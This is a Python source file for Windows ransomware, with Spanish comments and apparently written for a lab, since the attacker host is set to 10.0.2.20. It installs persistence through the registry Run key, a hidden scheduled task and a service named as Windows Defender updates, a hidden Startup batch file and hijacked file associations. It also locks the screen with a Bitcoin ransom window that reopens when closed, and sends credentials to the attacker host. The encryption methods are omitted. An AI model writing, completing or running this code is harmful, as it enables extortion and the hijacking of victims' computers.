import os
import sys
import random
import string
import requests
import time
import subprocess
import ctypes
import threading
import winreg
import getpass
from pathlib import Path
import tkinter as tk
from tkinter import messagebox
import psutil

class RansomwarePersistente:
    def __init__(self):
        self.directories_to_encrypt = [
            '~/Documents',
            '~/Downloads', 
            '~/Desktop',
            '~/Pictures',
            '~/Videos',
            '~/Music'
        ]
        self.excluded_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)',
            'System32', 'Windows.old', 'Recovery', '$Recycle.Bin'
        ]
        self.kali_ip = "10.0.2.20"
        self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        self.price = 500
        self.url = f'http://{self.kali_ip}/victima.php'
        self.encryption_count = 0
        self.password = None
        self.victim_id = None
        self.script_path = os.path.abspath(__file__)
        self.window_open = False
        self.current_window = None
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def show_banner(self):
        """Muestra el banner ASCII"""
        banner = """
 ██████╗ ██████╗ ███████╗██████╗ ████████╗██╗███╗   ██╗ ██████╗ 
██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║████╗  ██║██╔════╝ 
██║   ██║██████╔╝█████╗  ██████╔╝   ██║   ██║██╔██╗ ██║██║  ███╗
██║   ██║██╔══██╗██╔══╝  ██╔══██╗   ██║   ██║██║╚██╗██║██║   ██║
╚██████╔╝██║  ██║███████╗██║  ██║   ██║   ██║██║ ╚████║╚██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                 
 _nnnn_                      
dGGGGMMb     ,\"\"\"\"\"\"\"\"\"\"\"\"\".
@p~qp~~qMb    | Linux Rules! |
M|@||@) M|   _;..............'
|,----.JM| -'
JS^\\__/  qKL
dZP        qKRb
dZP          qKKb
fZP            SMMb
HZM            MMMM
FqM            MMMM
__| \".        |\\dS\"qML
|    `.       | `' \\Zq
_)      \\.___.,|     .'
\\____   )MMMMMP|   .'
     `-'       `--' hjm
==================================================
        TU INFORMACION HA SIDO SECUESTRADA
==================================================
"""
        print(banner)

    def install_persistence(self):
        """Instala multiples metodos de persistencia"""
        print("[*] Instalando persistencia...")
        try:
            # Metodo 1: Registro de Windows - Run
            self._install_registry_persistence()
            # Metodo 2: Tareas Programadas
            self._install_scheduled_task()
            # Metodo 3: Carpeta Startup
            self._install_startup_folder()
            # Metodo 4: Servicio de Windows (si es admin)
            if self.is_admin():
                self._install_windows_service()
            
            # Metodo 5: File association hijacking
            self._install_file_association()
            
            print("[+] Persistencia instalada correctamente")
            return True
        except Exception as e:
            print("[-] Error instalando persistencia:", e)
            return False

    def _install_file_association(self):
        """Hijack de asociaciones de archivos para mostrar ventana ransomware"""
        try:
            # Extensiones comunes a hijack
            extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', 
                         '.mp3', '.mp4', '.xls', '.xlsx', '.zip', '.rar']
            
            for ext in extensions:
                try:
                    # Crear asociación que ejecute nuestro script
                    key_path = f"{ext}\\shell\\open\\command"
                    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, f"Software\\Classes\\{key_path}") as key:
                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{sys.executable}" "{self.script_path}" "%1"')
                except:
                    pass
                    
            print(" [+] Hijack de asociaciones de archivos instalado")
        except Exception as e:
            print(" [-] Error en hijack de archivos:", e)

    def _install_registry_persistence(self):
        """Instala persistencia en el registro de Windows"""
        try:
            # Current User Run
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{sys.executable}" "{self.script_path}"')
            print(" [+] Persistencia en registro (HKCU) instalada")
        except Exception as e:
            print(" [-] Error en registro HKCU:", e)

    def _install_scheduled_task(self):
        """Crea una tarea programada"""
        try:
            task_name = "WindowsDefenderUpdate"
            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Defender Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{getpass.getuser()}</UserId>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{sys.executable}"</Command>
      <Arguments>"{self.script_path}"</Arguments>
    </Exec>
  </Actions>
</Task>'''
            # Guardar XML temporalmente
            xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
            with open(xml_path, 'w') as f:
                f.write(task_xml)
            # Crear tarea
            subprocess.run([
                'schtasks', '/create', '/tn', task_name, '/xml', xml_path, '/f'
            ], capture_output=True, shell=True)
            # Limpiar
            os.remove(xml_path)
            print(" [+] Tarea programada instalada")
        except Exception as e:
            print(" [-] Error en tarea programada:", e)

    def _install_startup_folder(self):
        """Copia el script a la carpeta de inicio"""
        try:
            startup_folder = os.path.join(
                os.path.expanduser('~'),
                'AppData', 'Roaming', 'Microsoft', 'Windows',
                'Start Menu', 'Programs', 'Startup'
            )
            if os.path.exists(startup_folder):
                bat_content = f'@echo off\n"{sys.executable}" "{self.script_path}"\n'
                bat_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
                with open(bat_path, 'w') as f:
                    f.write(bat_content)
                # Ocultar archivo
                subprocess.run(f'attrib +h "{bat_path}"', shell=True, capture_output=True)
                print(" [+] Persistencia en carpeta Startup instalada")
        except Exception as e:
            print(" [-] Error en carpeta Startup:", e)

    def _install_windows_service(self):
        """Instala como servicio de Windows (requiere admin)"""
        try:
            service_name = "WindowsDefenderUpdate"
            # Usar sc para crear el servicio
            subprocess.run([
                'sc', 'create', service_name,
                f'binpath= "{sys.executable} {self.script_path}"',
                'start= auto',
                'displayname= "Windows Defender Update Service"'
            ], capture_output=True, shell=True)
            print(" [+] Servicio de Windows instalado")
        except Exception as e:
            print(" [-] Error instalando servicio:", e)

    def start_file_monitor(self):
        """Inicia el monitoreo de apertura de archivos"""
        def monitor():
            while True:
                try:
                    # Verificar procesos recién abiertos
                    for proc in psutil.process_iter(['name', 'create_time']):
                        try:
                            proc_name = proc.info['name'].lower()
                            # Si se abre un programa común, mostrar ventana ransomware
                            if any(app in proc_name for app in ['notepad', 'word', 'excel', 'powerpnt', 
                                                              'acrobat', 'photoshop', 'winword', 'excel',
                                                              'mspaint', 'calculator', 'chrome', 'firefox',
                                                              'edge', 'explorer']):
                                if not self.window_open:
                                    self.show_ransomware_window()
                        except:
                            pass
                    time.sleep(2)
                except:
                    pass
        
        monitor_thread = threading.Thread(target=monitor, daemon=True)
        monitor_thread.start()

    def show_ransomware_window(self):
        """Muestra la ventana de ransomware estilo WannaCry con fondo negro"""
        if self.window_open:
            return
            
        try:
            self.window_open = True
            root = tk.Tk()
            self.current_window = root
            root.title("!!! WARNING !!!")
            root.attributes("-topmost", True)
            root.configure(bg="black")
            root.attributes("-fullscreen", True)
            
            # Bindear teclas para prevenir escape
            root.bind("<Escape>", lambda e: "break")
            root.bind("<Alt-F4>", lambda e: "break")
            root.bind("<Super_L>", lambda e: "break")
            root.bind("<Super_R>", lambda e: "break")
            
            # Frame principal con fondo negro
            main_frame = tk.Frame(root, bg="black")
            main_frame.pack(fill="both", expand=True, padx=50, pady=50)
            
            # Arte ASCII en rojo
            ascii_frame = tk.Frame(main_frame, bg="black")
            ascii_frame.pack(fill="x", pady=20)
            
            ascii_art = """
 ██████╗ ██████╗ ███████╗██████╗ ████████╗██╗███╗   ██╗ ██████╗ 
██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║████╗  ██║██╔════╝ 
██║   ██║██████╔╝█████╗  ██████╔╝   ██║   ██║██╔██╗ ██║██║  ███╗
██║   ██║██╔══██╗██╔══╝  ██╔══██╗   ██║   ██║██║╚██╗██║██║   ██║
╚██████╔╝██║  ██║███████╗██║  ██║   ██║   ██║██║ ╚████║╚██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                 
 _nnnn_                      
dGGGGMMb     ,\"\"\"\"\"\"\"\"\"\"\"\"\".
@p~qp~~qMb    | Linux Rules! |
M|@||@) M|   _;..............'
|,----.JM| -'
JS^\\__/  qKL
dZP        qKRb
dZP          qKKb
fZP            SMMb
HZM            MMMM
FqM            MMMM
__| \".        |\\dS\"qML
|    `.       | `' \\Zq
_)      \\.___.,|     .'
\\____   )MMMMMP|   .'
     `-'       `--' hjm
"""
            ascii_label = tk.Label(
                ascii_frame,
                text=ascii_art,
                font=("Courier New", 8),
                fg="red",
                bg="black",
                justify="left"
            )
            ascii_label.pack()
            
            # Mensaje principal
            message_frame = tk.Frame(main_frame, bg="black")
            message_frame.pack(fill="x", pady=20)
            
            main_message = tk.Label(
                message_frame,
                text="¡TU SISTEMA HA SIDO SECUESTRADO!\nTODOS TUS ARCHIVOS HAN SIDO CIFRADOS",
                font=("Arial", 16, "bold"),
                fg="red",
                bg="black",
                justify="center"
            )
            main_message.pack(pady=10)
            
            # Información de rescate
            info_frame = tk.Frame(main_frame, bg="black")
            info_frame.pack(fill="x", pady=15)
            
            # ID único
            id_label = tk.Label(
                info_frame,
                text=f"ID ÚNICO: {self.victim_id}",
                font=("Arial", 12, "bold"),
                fg="yellow",
                bg="black"
            )
            id_label.pack()
            
            # Precio
            price_label = tk.Label(
                info_frame,
                text=f"RESCATE: ${self.price} USD EN BITCOIN",
                font=("Arial", 12, "bold"),
                fg="yellow",
                bg="black"
            )
            price_label.pack(pady=5)
            
            # Dirección Bitcoin
            btc_frame = tk.Frame(main_frame, bg="black")
            btc_frame.pack(fill="x", pady=10)
            
            btc_label = tk.Label(
                btc_frame,
                text=f"BITCOIN: {self.bitcoin}",
                font=("Courier New", 10),
                fg="cyan",
                bg="black"
            )
            btc_label.pack()
            
            # Frame de entrada de clave
            input_frame = tk.Frame(main_frame, bg="black")
            input_frame.pack(fill="x", pady=20)
            
            input_label = tk.Label(
                input_frame,
                text="INGRESE LA CLAVE DE DESCIFRADO:",
                font=("Arial", 12, "bold"),
                fg="white",
                bg="black"
            )
            input_label.pack(pady=10)
            
            # Entrada de clave
            self.password_var = tk.StringVar()
            password_entry = tk.Entry(
                input_frame,
                textvariable=self.password_var,
                font=("Arial", 14),
                width=40,
                show="*",
                relief="solid",
                bd=3,
                bg="white",
                fg="black"
            )
            password_entry.pack(pady=10)
            password_entry.focus()
            
            # Botones
            button_frame = tk.Frame(main_frame, bg="black")
            button_frame.pack(fill="x", pady=15)
            
            verify_btn = tk.Button(
                button_frame,
                text="VERIFICAR CLAVE",
                font=("Arial", 12, "bold"),
                bg="red",
                fg="white",
                command=lambda: self.verify_decryption_key(root),
                width=20,
                height=2
            )
            verify_btn.pack()
            
            # Advertencias
            warning_frame = tk.Frame(main_frame, bg="black")
            warning_frame.pack(fill="x", pady=10)
            
            warnings = tk.Label(
                warning_frame,
                text="ADVERTENCIA: NO CIERRE ESTA VENTANA - NO REINICIE EL SISTEMA\nLOS ARCHIVOS SE PERDERÁN PERMANENTEMENTE SI NO PAGA EL RESCATE",
                font=("Arial", 10),
                fg="orange",
                bg="black",
                justify="center"
            )
            warnings.pack()
            
            # Tiempo transcurrido
            self.counter = 0
            time_frame = tk.Frame(main_frame, bg="black")
            time_frame.pack(fill="x", pady=5)
            
            self.time_label = tk.Label(
                time_frame,
                text="TIEMPO BLOQUEADO: 0 SEGUNDOS",
                font=("Arial", 10),
                fg="gray",
                bg="black"
            )
            self.time_label.pack()
            
            # Iniciar contador
            self.update_counter(root)
            
            # Vincular Enter a verificación
            password_entry.bind('<Return>', lambda e: self.verify_decryption_key(root))
            
            # Iniciar monitoreo de cierre
            self.monitor_window_close(root)
            
            root.mainloop()
            
        except Exception as e:
            print(f"Error mostrando ventana: {e}")
            self.window_open = False

    def monitor_window_close(self, root):
        """Monitorea si la ventana se cierra y la reabre"""
        def check_window():
            try:
                root.winfo_exists()
                root.after(1000, check_window)
            except:
                self.window_open = False
                # Reabrir ventana después de 2 segundos
                threading.Timer(2, self.show_ransomware_window).start()
                
        root.after(1000, check_window)

    def verify_decryption_key(self, root):
        """Verifica si la clave de descifrado es correcta"""
        entered_password = self.password_var.get()
        if entered_password == self.password:
            messagebox.showinfo("ÉXITO", "Clave correcta! Iniciando proceso de descifrado...")
            root.destroy()
            self.window_open = False
            self.start_decryption()
        else:
            messagebox.showerror("ERROR", "Clave incorrecta. El sistema permanece bloqueado.")
            self.password_var.set("")

    def update_counter(self, root):
        """Actualiza el contador de tiempo"""
        self.counter += 1
        if hasattr(self, 'time_label'):
            self.time_label.config(text=f"TIEMPO BLOQUEADO: {self.counter} SEGUNDOS")
        root.after(1000, lambda: self.update_counter(root))

    def start_decryption(self):
        """Inicia el proceso de descifrado"""
        try:
            decrypt_script = f'''
import os
import winreg
import subprocess
import sys

VICTIM_ID = "{self.victim_id}"
PASSWORD = "{self.password}"

def main():
    print("Sistema de Recuperación de Archivos")
    print("===================================")
    print(f"ID de víctima: {{VICTIM_ID}}")
    
    # Descifrar archivos
    encrypted_files = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith('.LOCKED'):
                encrypted_files.append(os.path.join(root, file))
    
    success_count = 0
    for enc_file in encrypted_files:
        try:
            original_file = enc_file[:-7]  # Remover .LOCKED
            os.rename(enc_file, original_file)
            success_count += 1
            print(f"[+] Recuperado: {{os.path.basename(original_file)}}")
        except Exception as e:
            print(f"[-] Error con {{os.path.basename(enc_file)}}: {{e}}")
    
    # Remover persistencia
    print("\\n[*] Removiendo persistencia...")
    try:
        # Remover del registro
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            try:
                winreg.DeleteValue(reg_key, "WindowsUpdateService")
                print("[+] Persistencia del registro removida")
            except:
                pass
        
        # Remover tarea programada
        os.system('schtasks /delete /tn "WindowsDefenderUpdate" /f 2>nul')
        print("[+] Tarea programada removida")
        
        # Remover archivos temporales
        files_to_remove = ["LEAME_URGENTE.txt", "INSTRUCCIONES.txt", "CREDENCIALES_LOCALES.txt"]
        for file in files_to_remove:
            if os.path.exists(file):
                os.remove(file)
                print(f"[+] Archivo {{file}} removido")
                
    except Exception as e:
        print(f"[-] Error removiendo persistencia: {{e}}")
    
    print(f"\\n[+] Proceso completado!")
    print(f"[*] Archivos recuperados: {{success_count}}/{{len(encrypted_files)}}")
    print("\\n[+] Sistema completamente recuperado y limpio!")
    input("Presione Enter para salir...")

if __name__ == "__main__":
    main()
'''
            with open('DECRYPT_FILES.py', 'w') as f:
                f.write(decrypt_script)
                
            subprocess.Popen([sys.executable, 'DECRYPT_FILES.py'])
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo iniciar el descifrado: {e}")

    # ... (mantén los otros métodos igual: check_persistence, expand_paths, should_encrypt, 
    # generate_keys, test_connection, send_credentials, save_credentials_local,
    # encrypt_file_windows, encrypt_directory, create_ransom_note, kill_system_tools,
    # disable_task_manager)

    def execute_complete_lockdown(self):
        """Ejecuta el bloqueo completo del sistema"""
        self.show_banner()
        print("[*] INICIANDO BLOQUEO COMPLETO PERSISTENTE")
        print("=" * 50)
        
        # Verificar si ya está instalado
        if self.check_persistence():
            print("[*] El ransomware ya está instalado en el sistema")
            print("[*] Activando modo de ejecución persistente...")
        else:
            # Instalar persistencia en la primera ejecución
            print("[*] Instalando persistencia...")
            self.install_persistence()

        # Paso 1: Configurar conexión
        print("\\n[1/5] Configurando conexión...")
        connection_ok = self.test_connection()
        
        # Continuar automáticamente sin conexión
        if not connection_ok:
            print("[*] Continuando sin conexión al servidor...")

        # Paso 2: Generar claves
        print("\\n[2/5] Generando claves...")
        self.generate_keys()

        # Paso 3: Enviar credenciales
        if connection_ok:
            print("\\n[3/5] Enviando credenciales...")
            self.send_credentials()
        else:
            print("\\n[3/5] Guardando credenciales localmente...")
            self.save_credentials_local()

        # Paso 4: Cifrar archivos
        print("\\n[4/5] Cifrando archivos...")
        directories = self.expand_paths()
        total_encrypted = 0
        for directory in directories:
            encrypted = self.encrypt_directory(directory)
            total_encrypted += encrypted
            print(" " + directory + ": " + str(encrypted) + " archivos")

        # Paso 5: Bloquear sistema y monitorear
        print("\\n[5/5] Activando bloqueo completo...")
        self.create_ransom_note()
        self.kill_system_tools()
        self.disable_task_manager()
        
        print("[+] SISTEMA BLOQUEADO PERSISTENTEMENTE")
        print("[*] Archivos cifrados: " + str(total_encrypted))
        print("[*] Clave: " + self.password)
        
        # Iniciar monitoreo de archivos
        self.start_file_monitor()
        
        # Mostrar ventana principal inmediatamente
        self.show_ransomware_window()
        
        # Mantener el script corriendo
        while True:
            time.sleep(10)

if __name__ == "__main__":
    ransomware = RansomwarePersistente()
    try:
        ransomware.execute_complete_lockdown()
    except KeyboardInterrupt:
        print("\\n[*] Ejecución interrumpida")
    except Exception as e:
        print("\\n[-] Error:", e)
